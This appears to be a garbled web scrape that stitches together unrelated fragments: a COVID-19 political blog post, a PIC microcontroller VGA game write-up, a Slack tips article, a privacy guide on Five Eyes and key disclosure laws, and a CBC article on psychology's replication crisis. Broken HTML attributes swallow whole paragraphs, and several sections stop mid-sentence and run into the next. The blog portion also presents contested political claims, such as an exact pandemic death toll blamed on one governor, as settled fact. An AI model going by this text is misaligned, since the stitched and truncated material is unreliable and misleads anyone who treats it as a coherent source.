<p><strong>Wanting to specialize</strong> in machine learning, or perhaps a specific niche in machine learning such as neural text generation (read: <a href="https://mc.ai/the-subtle-art-of-priming-gpt-3/" target="_blank">GPT-3 primer</a>). While being end-to-end is valuable, we also need such world-class experts in research and industry who push the envelope. Much of what we have in ML came from academia and pure research efforts.</p>

<p id="block-6b03038c-9c83-457c-9309-918c951f7cbc">That was until the <a href="https://realscience.community/wiki/covid-19-pandemic/" target="_blank" title="From Wikipedia, the free encyclopedia.

I re-engaged with politics with a whole new pair of eyes. It was pretty hard for me to ignore the pandemic, especially because I was so stringently locked down in my Cambridge apartment, working remotely, having very few people that I could see. I was desperate to make sense of things, desperate for some control over my life, desperate to make sure the people that I love are ok, and desperate for a hug. The pandemic also just happened to be aligned with many things that I have expertise in- medicine, data <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia.

I am both a medical doctor (not practicing) and I have a PhD. I currently am a Computational Biologist at MIT. My undergraduate and postbac years were spent in virology labs. So I felt compelled to be back on Facebook, talking to friends about the Pandemic, trying to help people navigate it. But at the same time, I was still attempting to mostly ignore the lay press. I was reading almost exclusively <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> journals and analyzing data myself. And the odd thing is, I was coming to very different conclusions than many of my friends, most of whom are liberal and many of whom have PhDs or MDs or both. For the first time in my life, people were arguing with me and in some cases, <em>mad at me</em>, for what I was saying on Facebook, and it took me by surprise.</p>



<p id="block-87ecc4f7-17e6-4afe-8253-97bf0b9081c3">Here is an example of this, on March 20th, I posted this “New York is growing exponentially faster than Italy- 8x rise in 5 days- 16k cases- this is holy fucking shit level. Please shelter in place NY even if your government has been catastrophically slow at asking you to do so.” with some analysis that I had done from online databases- (screen shot below). Surprisingly, people on my Facebook page were pushing back with all sorts of untrue things- NY just has done more testing, UV light and hotter months will kill it, it’s not because of not shutting down- NY is just more crowded.</p>



<p id="block-02e564b2-41c3-4cdc-b13f-31658348dc2c">I was baffled. Where were they getting this from? None of this was true from my analysis.</p>



<figure id="block-dce67ef5-7bb3-48c1-a2f3-eb2574e48ead"><img src="https://realscience.community/wp-content/uploads/2020/08/March-20-black-boxes-1-576x1024.png" alt="This image has an empty alt attribute; its file name is March-20-black-boxes-1-576x1024.png"></figure><p id="block-74897d32-3107-48f6-9cdf-f85a125b8cbf">Turns out the answer is that they were getting their info from (and believing) NY Governor, Andrew Cuomo, through the mainstream liberal media. Below is a YouTube video of Cuomo’s press conference with Trump on March 18, 2020. At minute 20:31, he says the following: “As I’ve said every day, the more you test, the more positives you will find.” and “New York is the state that has the most number of cases. Again, you would have to correlate that to how many tests the other states are doing, because the more tests they’re doing, the more cases they will find.” and “Again, perspective, perspective, because we’re fighting the virus, we’re fighting fear. The fear is winning. And the fear is disconnected from the facts. Fear is an emotion. Emotion can often be disconnected from facts, and that’s what happening here.”</p>



<figure id="block-db6f72ec-3731-4558-822b-ea9dbb94c1a2"><img src="https://realscience.community/wp-content/uploads/2020/08/image-1-1024x591.png" alt="This image has an empty alt attribute; its file name is image-1-1024x591.png"></figure><p id="block-534c5863-748e-4e26-8f20-d0e60c0aa999">And this was quoted and propagated by the news-<a href="https://www.cnn.com/2020/03/21/politics/new-york-andrew-cuomo-coronavirus-spread/index.html">like CNN’s March 21st article</a> and <a href="https://www.nbcnews.com/news/us-news/coronavirus-cases-new-york-state-now-top-10-000-n1165626">NBC’s March 21st article</a> – “The more tests you take, the more positives you find,” he said, adding that New York is now conducting more tests per capita than China or South Korea.”</p>



<p id="block-e894bbf7-ef23-45c8-8cff-03fce469fe28"><strong>Why is this false information? or blue #fakesciencenews</strong></p>



<p id="block-e894bbf7-ef23-45c8-8cff-03fce469fe28">Because only symptomatic people were being tested. Health insurance wasn’t paying for people without symptoms to be tested (and still isn’t in most places). They were <strong>testing more BECAUSE more people were sick, NOT finding more cases because they were testing more.</strong> Also the percent positives and hospitalization rates were going up, proving that testing was not the reason for the increased number of cases.</p>



<p id="block-cc3eb2a1-ec9c-4417-a779-cf2c4bcbd7e0">I have to say, I have heard President Trump say these exact same things. The two of them, Trump and Cuomo, have pretty similar rhetoric.</p>



<p id="block-59df9799-baae-4608-ab83-e57e076ee46a">Cuomo also at that time, said that if you told him to shelter-in-place, he personally wouldn’t listen, he’d just go have fun instead. This is documented in this <a href="https://www.nbcnews.com/news/us-news/ny-gov-cuomo-says-no-new-york-city-s-shelter-n1162911">March 18th NBC article</a>:</p>







<p id="block-143b308e-8bd8-48c8-b918-dc73798bfe37">March 18, 2020, 12:58 PM EDT&nbsp;/&nbsp;Updated&nbsp;March 18, 2020, 3:46 PM EDT By&nbsp;Tom Winter and Corky Siemaszko</p>



<p id="block-bcab33e2-05e1-4ff0-a6bf-2ca6632c6612">New York Gov. Andrew Cuomo had some choice words Wednesday for New York City mayor Bill de Blasio’s proposal to effectively shut the city down to stop the spread of the coronavirus: Not a chance…</p>



<p id="block-6a86db55-108c-4762-ba17-c55f943cc351">Cuomo echoed that point later at a press conference saying, “it just can’t be New York City.”</p>



<p id="block-8e0ff99d-5fe9-4d0e-828b-cc1673a388d5">“I’m from Queens and if you tell me to shelter-in-place I’ll just go stay with my sister in Westchester (County) and have a good time,” he said.”</p>



<p id="block-180b71a6-053f-4db0-bbfb-c4d81fa4c838">So in summary, I got yelled at by my educated liberal friends for singling out NYC to shut down because the liberal media was quoting the dangerous and reckless rhetoric and decisions by Andrew Cuomo.</p>



<p id="block-ef1b178b-8509-4080-beb3-01a78ed937c9"><strong>Obviously, we know what happened in NYC after that– 30,000 people died because Cuomo didn’t shut down in time.</strong></p>



<p id="block-84af9b9a-cc0f-4136-94df-b79be61bfc5b">That was one example of many of the blue #fakesciencenews stories- aimed at saving Cuomo’s butt (or whatever the political agenda was) that was believed by liberals because it was from a liberal news source.</p>



<p id="block-83aabbcc-fff3-44bd-9c96-4011de750e97"><strong>What about the red #fakesciencenews?</strong></p>



<p id="block-03b83506-17cf-413d-bfae-447b54ab4e13">Beginning to understand the perspective of the right and how it was driven by fake <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation).

The best example of this was a little later on in the pandemic during the first weeks of re-opening. I <strong>was VERY worried about the onslaught of rising cases that was about to happen and high-risk people not taking it seriously</strong>, including some of my own friends and family. There was a false narrative circulating that somehow the virus was just going to magically disappear, even though places still had lots of cases.</p>



<p id="block-deb3c9e4-4920-417b-b259-4651006f4031">This was being pushed by Trump, Pence, and the conservative media. They were downplaying the virus’s seriousness.</p>



<figure id="block-3d54e755-8904-47ff-b36c-df43995695af"><img src="https://realscience.community/wp-content/uploads/2020/08/covid-hoax.jpeg" alt="This image has an empty alt attribute; its file name is covid-hoax.jpeg"></figure><p id="block-f9b9c31a-4ff5-4824-b25a-12b49f9c5d4e">Trump and Pence were also vocally against masks at that time, including by example (see pic below). This was incredibly harmful and a lot of people died unnecessarily because of it.</p>



<figure id="block-48c238e1-81a3-4860-a333-3ff888c9354b"><img src="https://realscience.community/wp-content/uploads/2020/08/pence-no-mask-1024x512.jpeg" alt="This image has an empty alt attribute; its file name is pence-no-mask-1024x512.jpeg"></figure><p id="block-2b65c71e-ff78-49b0-8549-b210c168ef38">On June 12th, I posted this to AFS’s Facebook page in order to try and get public health messaging out to save lives:</p>

People were mad at Cuomo and rightfully so. I am outraged at his actions personally. People think the virus is a hoax. People are worried about the economy. People are pointing out the hypocrisy of the liberal media saying that protests don’t spread COVID but reopening does. Here are some more responses:</p>



<figure id="block-d6bf0481-f7e7-4c33-8563-f646a0127b0c"><img src="https://realscience.community/wp-content/uploads/2020/08/image-5.png" alt="This image has an empty alt attribute; its file name is image-5.png"></figure><p id="block-24310a82-4b4d-4c2f-b958-cf09cf49a8a0">That top one is just amazing (and racist of course, <strong>no excuses</strong> for that). More calling out of hypocrisy of protests vs. reopening.</p>



<figure id="block-4dfff567-169c-4b79-b1ef-40a8a8634f96"><img src="https://realscience.community/wp-content/uploads/2020/08/image-6.png" alt="This image has an empty alt attribute; its file name is image-6.png"></figure><p id="block-c2234e34-3785-43d2-a1d2-2284c3224d83">The above posts were my first introduction to the Bill Gates microchipping conspiracy theory and to Agenda 21. The top post does also have some valid points about confusion about death rates, unreliable tests, media induced hysteria, and bogus treatments that are killing people. And so I actually found myself agreeing with some of the things being said. And more importantly, I was starting to get why people would feel this way.</p>



<p id="block-3862550a-2b2e-4b15-b23c-7fe5afc0d3ed">People were also very confused and eager to talk about the math behind the death rates etc. When people realized that I wasn’t just some liberal propaganda bot, the convos were really very constructive on the whole. Below is one of the many back and forths I had about the math.</p>

			  <img height="515" src="http://www.voja.rs/PROJECTS/GAME_HTM/timings.gif" width="700">Video 
			  processors are not typically embedded in microcontrollers, so 
			  using the external video display unit is considered in gaming 
			  consoles. As this is the minimalistic project, VGA video signal is 
			  generated by software, based on interrupt driven kernel.</p>
			  <p>
			  &nbsp;The
              routine which generates VGA signal is the part of&nbsp;
			  <strong>T2</strong> (<b>Timer 2</b> module) interrupt service 
			  routine. This routine also services vertical sync pulse, markers 
			  for monitor auto adjustment and the bottom line text routine. At 
			  this version, no other interrupts are active, but the user can add 
			  his own interrupt sources, as long as they have the lower
              priority level.</p>
			  
			  <p>
			  <strong>Timing details</strong></p>
              <p>VGA
              timings for resolution <b> 800x600</b> in <b> 56Hz</b> refresh 
			  rate are represented on the drawing. Here are detailed
              timings data:</p>
              <p><u>Horizontal
              timing:</u></p>
              <p>Pixel clock: 36 MHz 
			  (13.89 ns)<br>
              Horizontal frequency/period: 35.16 KHz (28.44 us)<br>
              Visible area: 800 pixels (22.22 us)<br>
              Front porch: 24 pixels (0.67 us)<br>
              Sync pulse: 72 pixels (2 us)<br>
              Back porch: 128 pixels (3.56 us)</p>
              <p><u>Vertical
              timing:</u></p>
              <p>Vertical
              frequency/period: 56 Hz (17.86 ms)<br>
              Visible area: 600 lines (17.067 ms)<br>
              Front porch: 1 line (28.44 us)<br>
              Sync pulse: 2 lines (56.89 us)<br>
              Back porch: 22 lines (625.78 us)<br>
              Whole frame: 625 lines (17.78 ms)</p>
              <p>Dot clock for
              <b> 800x600</b> resolution <b> @ 56 Hz</b> vertical frequency is
              exactly <b> 36 MHz</b>, and the maximum execution speed for
			  <strong>PIC24E</strong> family is <strong>70 MIPS</strong>. So the 
			  MCU has to be slightly overclocked to <strong>72 MHz</strong> to 
			  get the desired instruction/pixel clock rate. This overclocking is 
			  only 2.8%, which is 
			  negligible and will not noticeable affect operational safety or thermal 
			  dissipation.</p>
			  <p>As it was noted, 
			  each pixel takes the place of 2x2 pixels area, so the actual dot clock is not 36 but 18 MHz. 
			  That gives enough time to the processor to execute four instructions 
			  in one pixel timing. In addition, every scan line is displayed 
			  twice, so there is even more time for buffer setup during 
			  horizontal sync and porches.</p>
			  
			<p>
			<strong>RAM organization</strong></p>
			<p>Video memory is 
			located in internal 
			48 KB RAM, where it occupies 45600 bytes. All video signal timings match VGA standard in <b> 800x600</b> mode, 
			but, due to RAM limitations, the actuual displayed resolution is only 
			<strong>380x240</strong>, and it is displayed on <strong>760x480</strong> 
			pixels original screen area.</p>
			<p>
			To use the whole <strong>800x600</strong> display area in 
			8-bit pixel mode, we need 800x600=<strong>480,000</strong> bytes of memory, but 
			in the best case, all that PIC microcontrollers offer at this 
			time is only 48K (<strong>49,152</strong> bytes), which is too far from what we need. There are some 16-bit PICs with 
			<strong>96K</strong> RAM, but they are too 
			slow for video signal generation, and some <strong>52K</strong> PICS, 
			but they are in SMD 64-pin packages with 0.5 mm pitch, which is 
			quite unconvenient for&nbsp; DIY projects. Although it is possible 
			to add external RAM, it is of no practical use, as the access to the 
			external RAM would be too slow. So we have to do it with 
			<strong>48K</strong> RAM MCUs somehow.</p>
			<p>
			To do that, we have to make some copromises:</p>
			<p>
			1. The colour of each pixel is defined by four bits only, so it works in 
			16-colour mode. In fact, only 15 colours are used, as one of them 
			(binary represened as 0000) does not mean "black" but "transparent", 
			which shalll be used in sprite handling. More about that later.</p>
			  <p>
			2. Each pixel from the video memory is displayed on 4-pixel (2x2) 
			area of the VGA screen.</p>
			<p>
			3. Actual displayed resolution is 380x240, which occupies 760x480 
			pixels on the screen. The 20 pixel wide margin on the top, left and 
			right side of the monitor are not used and are left black. At the 
			bottom there is one line (39 characters) of text. It needs no frame 
			buffer, as the routine interprets text directly from the text buffer in RAM.</p>
			<p>
			This organization gives 380x240=91,200 graphical pixels, but as 
			each pixel is covered by 4 bits, the video memory needs only 
			91,200/2=45,600 bytes of memory. Bottom line text needs no video 
			buffer and it occupies only 78 
			bytes (39 for text and 39 for colour attributes). So there are 
			49,152-45,678=3,474 free bytes, which is quite enough for housekeeping 
			(internal buffers and general purpose registers).</p>
			  
			  <p>
			  <strong>Sprites</strong></p>
			  <p>
			  With the processing power of 72 MIPS, it would be easy to generate the video signal 
			  by software, if 
			  the only requirement is to show the contents of video memory. As 
			  there is no video processing unit here and the MCU has to handle 
			  one pixel at a time, such concept would be useful for static 
			  images or very small movable blocks of pixels, but not for the 
			  game, which requires real time processing of large memory blocks. 
			  To make things worse, more than 1/3 of the time CPU is busy 
			  generating video signal, which leaves only 1/3 for housekeeping 
			  and active memory handling.</p>
			  <p>
			  The solution to this problem is to use <strong><em>sprites</em></strong>, 
			  which are 2D images located outside the video RAM, and somehow 
			  superimposed in the main scene. Video units in some of the first 
			  personal computers could handle sprites in hardware, but in this 
			  project it is realized in software. The sprites are in internal 
			  program memory of the MCU and they are combined with video RAM 
			  contents to generate the full video signal. That means that there 
			  is no way to manipulate the sprite contents, it can only be 
			  displayed at the desired location of the screen. As the most of characters in 
			  this game are animated, there is a large number of pixels, and 
			  each of them represents one frame of that pixel in the 
			  animation.&nbsp;Here is the example of Jack's jump. Note 
			  that X and Y absolute position on the screen is permanently 
			  adjusted during 
			  the jump, as well as the order of slides in the jump sequence 
			  (which is listed in the script table in the firmware), so it gives 
			  much more freedom in creating the <em>Mise en scène</em> for the 
			  game - this jump is, in reality, much higher and lasts longer than 
			  it may look while just watching those slides. So there is no need 
			  to draw the equal slides again, as each of them can be called repeatedly 
			  in the script table. In this example, the last five slides are 
			  repeated only because of the hair splash, otherwise slides 11, 12, 
			  13, 14 and 15 could be ommited and listed as 9, 8, 
			  6, 4 and 3 in the script. The same slides are used for jump up and 
			  for jump down to the lower floor, but with different script 
			  tables.</p>
			  <p>
					  <img height="90" src="http://www.voja.rs/PROJECTS/GAME_HTM/jump.gif" width="582"></p>
			  <p>
			  All that software has to do while servicing the video scenario, is 
			  to preset the special sprite registers, determining X and Y 
			  positions (relative to the left and upper border of the active 
			  portion of the screen), 
			  width and height of one slide image, and address of the current 
			  slide in program memory. Video firmware, located in the interrupt 
			  routine, will superimpose that sprite in the content of the 
			  background video memory during RGB signal generation.</p>
			  <p>
			&nbsp;One more thing to note is that the orange colour in sprites 
			  means "transparent" (there is no orange colour in the 
			  game pallete, only in the pallete of the PC drawing program during 
			  sprite design process). 
			  Each orange pixel on the sprite will be displayed from the video memory, which will 
			  typically hold the background image. Yet, there is one drawback of 
			  this princip. If two or more sprites are overlapping, then 
			  transparent (orange) pixels on the 
			  first of them (which holds the highest priority, that means which 
			  is located higher on the special sprite table in RAM) will partly covered 
			  the lower sprite, displaying the background instead of lower 
			  sprite's active pixels. The first (simulated) screenshot 
			  shows that example.</p>
			  <p>
			  <img height="105" src="http://www.voja.rs/PROJECTS/GAME_HTM/overlapping2.gif" width="831"></p>
			  <p>
			&nbsp;There is the way to solve this problem, but only for the 
			  limited number of sprites. Some sprites can be treated as 
			  "special", and they do not have that drawback (see the second screenshot). 
			  The only problem with those sprites is that they require 18 times 
			  more time for the video routine to execute, so programmer has to 
			  take care not to use this option if it is not necessarry, as it 
			  could result in losing scan lines on the screen.</p>
			  <p>
			  <img height="105" src="http://www.voja.rs/PROJECTS/GAME_HTM/overlapping1.gif" width="441"></p>
			  <p>
			&nbsp;How to tell to the video routine which sprite is special, and 
			  which is not? The sprite list (located in RAM and named SPRITELIST) holds 
			  pointers for active sprites. The video routine can place (or erase) any 
			  sprite at that list at any time, and at any table position which 
			  is not currently occupied. This table can hold the 
			  maximum of 20 sprites at the same time. Only four sprites (number 
			  17, 18, 19 and 20) are 
			  treated as "special" ones - they are executed much slower, but they 
			  do not generate the described problem in overlapping conflict, or 
			  at least it is minimized so that it is not noticeable. In 
			  this game, only one sprite (Jack itself) has that privilege, as 
			  the game scenario is such that all other sprites will never be 
			  overlapped.</p>
			  
			  <p>
			  <strong>Theory of operation</strong></p>
			  <p>
			  The most significant part of the video routine uses SPRITEBUFFER, 
			  which is 190 bytes long (equal to one scan line in video memory), 
			  and in which the video routine prepares the sprite contents for 
			  the …</p></td></div></div>

				<p>Increasingly companies are bringing their entire workflows and data streams into Slack via apps, integrations, and APIs. Slack is currently reporting over <a href="https://kommandotech.com/statistics/slack-statistics/#:~:text=135%2C983%20companies%20are%20currently%20using,million%20people%20daily%20in%202019.">135,000 active companies</a> and that’s just the beginning amid a global rise of remote-first work.</p><p>Why this move to Slack? For millions of users, Slack is THE place for communication and collaboration. Slack is not just an email killer because it’s a novel form of communication. We already had SMS and WhatsApp. What Slack brings to the table is deeper-seated in company transparency and velocity.</p><p>Slack is seamlessly synchronous and asynchronous. It allows you to reduce context switching by creating a space for both short-form communication and long-form with a sprinkle of emoji-led authentic conversations and interactions. It also is beautifully designed.</p><p>Most importantly though, Slack brings in streams of information out of the countless siloed data sources in your consoles and Chrome browser tabs. It surfaces real-time and important metrics, queries, customer support tickets, PagerDuty downtime pings, and so much more. It’s become your dashboard for your company, team, and everything in between.</p><p>The average company loses <a href="https://slack.com/resources/why-use-slack/software-development-teams-and-slack">more than 20%</a> of its productive power to organizational drag. Put Slack in the picture though and development teams using Slack deliver 5% more output overall, with 23% faster time to market, 27% less time needed to test and iterate, and faster identification and resolution of engineering-related bugs, <a href="https://slack.com/resources/why-use-slack/software-development-teams-and-slack#">according to IDC research</a>.</p><p>Here at CTO.ai, we use a plethora of Slackbots and SlackOps to run our company. From our <a href="https://cto.ai/platform">Slack-first DevOps workflow automation platform</a> to Geekbot for company standups to the <a href="https://ops-community.slack.com/apps/A2RPP3NFR-jira-cloud">Jira chatbot</a> for our product roadmap to Greetbot to welcome new members of <a href="https://w.cto.ai/community">our Slack developer community</a>, we are believers that Slack is the key to fluid, meshed flow states that increase productivity and observability.</p><p>To say the least, we are big fans of Slack, but don’t take our word for it. Below are some Slack hacks, tips and tricks for developers and engineering teams of all ilks to get the most out of Slack. In no particular order, here are what DevOps and engineering workflows technical leaders are using in Slack:</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-1-send-delayed-messages">#1 Send Delayed Messages</h2><h3 id="lizzie-sigal-developer-evangelist-twilio"><em><a href="https://www.linkedin.com/in/elsiegle/">Lizzie Sigal</a>, Developer Evangelist, Twilio</em></h3><p>“The <a href="https://ops-community.slack.com/apps/ANPGHD2F8-gator">Gator Slack app</a> lets you send delayed messages at 9am in the recipient's time zone so as to not notify them if they've logged off for the day.

<img src="https://www.privacytools.io/assets/img/svg/layout/ukusa.svg" width="260" height="115" alt="UKUSA Agreement">

<p>The UKUSA Agreement is an agreement between the United Kingdom, United States, Australia, Canada, and New Zealand to cooperatively collect, analyze, and share intelligence. Members of this group, known as the <a href="https://www.giswatch.org/en/communications-surveillance/unmasking-five-eyes-global-surveillance-practices">Five Eyes</a>, focus on gathering and analyzing intelligence from different parts of the world. While Five Eyes countries have agreed to <a href="https://www.pbs.org/newshour/world/an-exclusive-club-the-five-countries-that-dont-spy-on-each-other">not spy on each other</a> as adversaries, leaks by Snowden have revealed that some Five Eyes members monitor each other's citizens and <a href="https://www.theguardian.com/uk/2013/jun/21/gchq-cables-secret-world-communications-nsa">share intelligence</a> to <a href="https://www.theguardian.com/politics/2013/jun/10/nsa-offers-intelligence-british-counterparts-blunkett">avoid breaking domestic laws</a> that prohibit them from spying on their own citizens. The Five Eyes alliance also cooperates with groups of third-party countries to share intelligence (forming the Nine Eyes and Fourteen Eyes); however, Five Eyes and third-party countries can and do spy on each other.</p>

<h3>Who is required to hand over the encryption keys to authorities?</h3>

<p>Mandatory <a href="https://en.wikipedia.org/wiki/Key_disclosure_law">key disclosure laws</a> require individuals to turn over encryption keys to law enforcement conducting a criminal investigation. How these laws are implemented (who may be legally compelled to assist) vary from nation to nation, but a warrant is generally required. Defenses against key disclosure laws include steganography and encrypting data in a way that provides plausible deniability.</p>  <p><a href="https://en.wikipedia.org/wiki/Steganography">Steganography</a> involves hiding sensitive information (which may be encrypted) inside of ordinary data (for example, encrypting an image file and then hiding it in an audio file). With plausible deniability, data is encrypted in a way that prevents an adversary from being able to prove that the information they are after exists (for example, one password may decrypt benign data and another password, used on the same file, could decrypt sensitive data).</p>



<p> * (people who know how to access a system may be ordered to share their knowledge, <strong>however, this doesn't apply to the suspect itself or family members.</strong>)</p>

<h3 id="usa">Why is it not recommended to choose a US-based service?</h3>

<img src="https://www.privacytools.io/assets/img/svg/layout/great_seal_of_the_united_states_obverse.svg" width="200" height="200" alt="USA">

<p>Services based in the United States are not recommended because of the country's surveillance programs and use of <a href="https://www.eff.org/issues/national-security-letters/faq">National Security Letters</a> (NSLs) with accompanying gag orders, which forbid the recipient from talking about the request. This combination allows the government to <a href="https://www.schneier.com/blog/archives/2013/08/more_on_the_nsa.html">secretly force</a> companies to grant complete access to customer data and transform the service into a tool of mass surveillance.</p>

<p>An example of this is <a href="https://en.wikipedia.org/wiki/Lavabit#Suspension_and_gag_order">Lavabit</a> – a secure email service created by Ladar Levison. The FBI <a href="https://www.vice.com/en_us/article/nzz888/lavabit-founder-ladar-levison-discusses-his-federal-battle-for-privacy">requested</a> Snowden's records after finding out that he used the service. Since Lavabit did not keep logs and email content was stored encrypted, the FBI served a subpoena (with a gag order) for the service's SSL keys. Having the SSL keys would allow them to access
communications (both metadata and unencrypted content) in real time for all of Lavabit's customers, not just Snowden's.</p>

<p>Ultimately, Levison turned over the SSL keys and <a href="https://www.theguardian.com/commentisfree/2014/may/20/why-did-lavabit-shut-down-snowden-email">shut down</a> the service at the same time. The US government then <a href="https://www.cnbc.com/id/100962389">threatened Levison with arrest</a>, saying that shutting down the service was a violation of the court order.</p>

<img src="https://www.privacytools.io/assets/img/svg/layout/warrant_canary_example.svg" width="450px" alt="Warrant Canary Example">

<p>A warrant canary is a posted document stating that an organization has not received any secret subpoenas during a specific period of time. If this document fails to be updated during the specified time then the user is to assume that the service has received such a subpoena and should stop using the service.</p>

He showed that precognition&nbsp;—&nbsp;the ability to sense the future — is real. His study was explosive, and shook the very foundations of psychology.&nbsp;</p>  <p>"This would probably be the most important research paper I would say ever published in any field, if it were true," said Jeff Galak, psychologist at Carnegie Mellon University.&nbsp;</p>  <p>"If this paper were true, our understanding of the entire world, the universe, physics, [and] psychology, for sure, would be completely different," Galak said.</p>  <p>"We would no longer see time as this linear thing that we move through, but instead something that can go forwards and backwards. And we could reach into the future and pull information from that — if it were true. And 'if 'is a big part of that statement."&nbsp;&nbsp;</p>  <h2>Replication crisis</h2>  <p>Daryl Bem is a professor emeritus of psychology at Cornell University. His paper, <em>Feeling the Future: Experimental Evidence for Anomalous Retroactive Influences on Cognition and Affect,</em>&nbsp;was published in the Journal of Personality and Social Psychology&nbsp;—&nbsp;a top-tier journal for the field.</p>  <p>"The [paper's] conclusion was ridiculous," said Chris Chambers, a professor of cognitive neuroscience at Cardiff University in Wales. He's the author of the book<em> The Seven Deadly Sins of Psychology.&nbsp;</em></p>  <p>"And this is really interesting because if a paper like this that's doing everything normally and properly can end up producing a ridiculous conclusion, then how many other papers that use those exact same methods that didn't reach ridiculous conclusions are similarly flawed?"</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>You have a right to scrutinize and verify and correct.​​​​<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Simine Vazire, psychologist&nbsp;</cite></span></blockquote>    <p>After <em>Feeling the Future</em>&nbsp;was published, a group called the Open Science Collaboration organized a massive replication study.

They could not be replicated under the filter of more rigorous methodology.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/michael-inzlicht.jpeg 300w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/michael-inzlicht.jpeg 460w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/michael-inzlicht.jpeg 620w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/michael-inzlicht.jpeg 780w,https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/michael-inzlicht.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5344903.1572637528!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/michael-inzlicht.jpeg"></p></div><figcaption>Michael Inzlicht is the principal investigator at the Toronto Laboratory for Social Neuroscience.<!-- --> <!-- -->(Submitted by Michael Inzlicht )</figcaption></figure></span></p>  <p>"I had grown up a scientist believing in the scientific method and the tools that we used, and all of a sudden, this one replication just made me question everything," said Inzlicht.&nbsp;</p>  <p>"What was real, what could I trust? The things I was studying... were they real? Could I trust them?"</p>  <p>Inzlicht is one of the psychologists leading the way to set new research standards. He attributes the lapse in his field to the tremendous pressure researchers face to produce new, high-impact research.</p>  <p>"Basic science is not always about chasing the new," said Inzlicht.&nbsp;</p>  <p>"It's not always about chasing something groundbreaking. It's about building a house. And if the foundations of the house are rotten, if from the beginning a discipline was built on shoddy foundations, the entire enterprise can fall."</p>  <h2>Building a new foundation</h2>  <p>Since 2011, standards for psychology research have indeed changed.&nbsp;</p>  <p>What's known as 'pre-registration' is becoming more common: researchers writing up how they're going to conduct a study, what their hypotheses are, and how they intend to analyze the data before doing their experiment. This protocol prevents researchers from massaging the data and reporting a positive result until they actually find one.</p>  <p>More than 200 scientific journals, both inside and outside psychology, now publish "registered reports," reporting their decision whether to accept or reject studies that are submitted before the experiments have actually been performed. So the decision is based on the proposed methodology and not how exciting the results 